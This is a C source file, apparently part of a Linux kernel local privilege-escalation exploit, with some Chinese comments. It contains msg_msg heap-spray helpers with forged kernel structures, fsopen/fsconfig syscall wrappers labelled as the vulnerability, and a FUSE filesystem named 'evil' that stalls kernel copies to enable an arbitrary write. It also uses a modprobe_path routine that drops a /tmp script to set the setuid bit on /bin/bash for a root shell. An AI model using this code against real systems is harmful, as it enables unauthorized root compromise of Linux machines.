#define _GNU_SOURCE

// clang-format off

#include <assert.h>
#include <fcntl.h>
#include <time.h>
#include <unistd.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <fuse.h>
#include <linux/sched.h>


// clang-format on

#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_DEFAULT "\033[0m"

#define log_debug(fmt, ...) \
  dprintf(2, "[*] %s:%d " fmt "\n", __FILE__, __LINE__, ##__VA_ARGS__)

#define log_info(fmt, ...)                                              \
  dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
          __LINE__, ##__VA_ARGS__)

#define log_warning(fmt, ...)                                            \
  dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
          __LINE__, ##__VA_ARGS__)

#define log_error(fmt, ...)                                           \
  dprintf(2, COLOR_RED "[-] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
          __LINE__, ##__VA_ARGS__)

#define die(fmt, ...)                       \
  do {                                      \
    log_error(fmt, ##__VA_ARGS__);          \
    log_error("Exit at line %d", __LINE__); \
    exit(1);                                \
  } while (0)

void debug() {
  log_warning("debug");
  getchar();
}

/**
 *   vulns
 */

#ifndef __NR_fsconfig
#define __NR_fsconfig 431
#endif
#ifndef __NR_fsopen
#define __NR_fsopen 430
#endif
#define FSCONFIG_SET_STRING 1
#define fsopen(name, flags) syscall(__NR_fsopen, name, flags)
#define fsconfig(fd, cmd, key, value, aux) \
  syscall(__NR_fsconfig, fd, cmd, key, value, aux)

/**
 * msg_msg
 */
struct list_head {
  uint64_t next;
  uint64_t prev;
};

struct msg_msg {
  struct list_head m_list;
  uint64_t m_type;
  uint64_t m_ts;
  uint64_t next;
  uint64_t security;
};

struct msg_msgseg {
  uint64_t next;
};

typedef struct msg {
  int mtype;
  char mtext[1];
} msg;

int make_msg_queue(void) { return msgget(IPC_PRIVATE, 0666 | IPC_CREAT); }

int recv_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
  return msgrcv(msqid, msgp, msgsz, msgtyp, 0);
}

int send_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
  ((struct msgbuf *)msgp)->mtype = msgtyp;
  return msgsnd(msqid, msgp, msgsz, 0);
}

int peek_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
  return msgrcv(msqid, msgp, msgsz, msgtyp,
                MSG_COPY | IPC_NOWAIT | MSG_NOERROR);
}

void build_msg(struct msg_msg *msg, uint64_t m_list_next, uint64_t m_list_prev,
               uint64_t m_type, uint64_t m_ts, uint64_t next,
               uint64_t security) {
  msg->m_list.next = m_list_next;
  msg->m_list.prev = m_list_prev;
  msg->m_type = m_type;
  msg->m_ts = m_ts;
  msg->next = next;
  msg->security = security;
}

void delete_msg_queue(int msqid, int cmd, struct msqid_ds *buf) {
  if ((msgctl(msqid, cmd, buf)) == -1) {
    die("delete msg queue fail");
  }
}

/**
 * modprobe_path
 */
#define SHELL "/bin/bash"
char *modprobe_win = "/tmp/w";
char *modprobe_trigger = "/tmp/root";
char *root_argv[] = {"-p", NULL};

void modprobe_init() {
  char filename[65];
  memset(filename, 0, sizeof(filename));
  int fd = open(modprobe_trigger, O_RDWR | O_CREAT);
  if (fd < 0) {
    perror("trigger creation failed");
    exit(-1);
  }
  char root[] = "\xff\xff\xff\xff";
  write(fd, root, sizeof(root));
  close(fd);
  char w[] = "#!/bin/sh\nchmod u+s " SHELL "\n";
  chmod(modprobe_trigger, 0777);
  fd = open(modprobe_win, O_RDWR | O_CREAT);
  if (fd < 0) {
    perror("winner creation failed");
    exit(-1);
  }
  write(fd, w, sizeof(w));
  close(fd);
  chmod(modprobe_win, 0777);
  return;
}

void modprobe_hax() {
  puts("[*] Attempting to trigger modprobe");
  execve(modprobe_trigger, NULL, NULL);
  return;
}

/**
 * fuse
 */
const char *evil_path = "evil";
int fuse_pipes[2];

int evil_read(const char *path, char *buf, size_t size, off_t offset,
              struct fuse_file_info *fi) {
  // change to modprobe_path
  char signal;
  char evil_buffer[0x1000];
  memset(evil_buffer, 0x43, sizeof(evil_buffer));

  char *evil = modprobe_win;

  // "/tmp/x" 字符串 写入 evil_buffer
  memcpy((void *)(evil_buffer + 0x1000 - 0x30), evil, sizeof(evil));
  size_t len = 0x1000;
  if (offset >= len) return size;
  if (offset + size > len)
    size = len - offset;
  // 这个buf 为传入的数据，是 0x1338000，就是 msg 消息
  memcpy(buf, evil_buffer + offset, size);

  // sync with the arb write thread
  read(fuse_pipes[0], &signal, 1);

  return size;
}

int evil_getattr(const char *path, struct stat *stbuf,
                 struct fuse_file_info *fi) {
  int res = 0;

  memset(stbuf, 0, sizeof(struct stat));

  if (strcmp(path, "/") == 0) {
    stbuf->st_mode = S_IFDIR | 0755;
    stbuf->st_nlink = 2;
  } else if (strcmp(path + 1, evil_path) == 0) {
    stbuf->st_mode = S_IFREG | 0444;
    stbuf->st_nlink = 1;
    stbuf->st_size = 0x1000;
  } else {
    res = -ENOENT;
  }

  return res;
}

// ls 展示内容
int evil_readdir(const char *path, void *buf, fuse_fill_dir_t filler,
                 off_t offset, struct fuse_file_info *fi,
                 enum fuse_readdir_flags flags) {
  if (strcmp(path, "/") != 0) return -ENOENT;

  filler(buf, ".", NULL, 0, 0);
  filler(buf, "..", NULL, 0, 0);
  filler(buf, evil_path, NULL, 0, 0);

  return 0;
}
